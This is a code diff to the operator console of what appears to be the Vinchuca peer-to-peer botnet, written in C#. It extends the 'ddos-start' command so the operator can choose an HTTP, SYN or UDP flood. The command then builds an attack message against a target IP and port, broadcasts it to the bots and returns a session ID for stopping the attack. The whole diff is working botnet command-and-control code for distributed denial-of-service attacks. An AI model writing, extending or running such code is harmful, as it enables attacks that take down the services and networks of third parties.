@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.Net;
 using Mono.Options;
-using Vinchuca.Network;
 using Vinchuca.Network.Protocol.Messages.Command;
 
 namespace Vinchuca.REPL
@@ -49,21 +48,45 @@ namespace Vinchuca.REPL
                     _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
                     return 1;
                 }
-                var endpointParts = Target.Split(new []{':'});
+                if (string.IsNullOrEmpty(Type))
+                {
+                    _repl.Console.WriteLine("commands: Missing required argument `--typet=TYPE`.");
+                    _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
+                    return 1;
+                }
+
+                DosAttackMessage.DosType type;
+                switch (Type)
+                {
+                    case "httpflood":
+                        type = DosAttackMessage.DosType.HttpFlood;
+                        break;
+                    case "synflood":
+                        type = DosAttackMessage.DosType.SynFlood;
+                        break;
+                    case "udpflood":
+                        type= DosAttackMessage.DosType.UdpFlood;
+                        break;
+                    default:
+                        _repl.Console.WriteLine("commands: Invalid attack type.");
+                        _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
+                        return 1;
+                }
+                var endpointParts = Target.Split(':');
                 var ip = endpointParts[0];
                 var port = int.Parse(endpointParts[1]);
                 var session = (ulong) Utils.RandomUtils.NextCorrelationId();
                 var ddosMessage = new DosAttackMessage()
                 {
                     AttackId = session,
-                    Type = (DosAttackMessage.DosType) 1,
+                    Type = type,
                     Threads = 4,
                     Target = new IPEndPoint(IPAddress.Parse(ip), port),
                     Buffer = new byte[0]
                 };
                 _agent.MessagesManager.Broadcast(ddosMessage, 6);
-                _repl.Console.WriteLine(string.Format("Attack sessionID {0}", session));
-                _repl.Console.WriteLine(string.Format("Stop it using ´ddos-stop {0}´", session));
+                _repl.Console.WriteLine($"Attack sessionID {session}");
+                _repl.Console.WriteLine($"Stop it using ´ddos-stop {session}´");
                 _repl.AddAutocompletionWords(session.ToString());
                 return 0;
             }
